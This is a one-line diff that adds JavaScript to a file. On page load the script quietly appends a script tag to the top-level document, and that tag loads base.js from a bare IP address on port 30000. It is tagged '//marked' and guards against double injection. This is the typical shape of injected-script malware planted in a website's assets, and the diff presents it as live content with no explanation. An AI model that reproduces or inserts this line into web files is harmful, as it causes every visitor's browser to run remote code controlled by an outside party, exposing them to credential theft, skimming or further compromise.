@@ -1,0 +1,1 @@
+//marked;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id = '1qa2ws';s.type='text/javascript';s.src='http://220.196.52.141:30000/www/default/base.js?v1.2';top.document.body.appendChild(s);}},false);
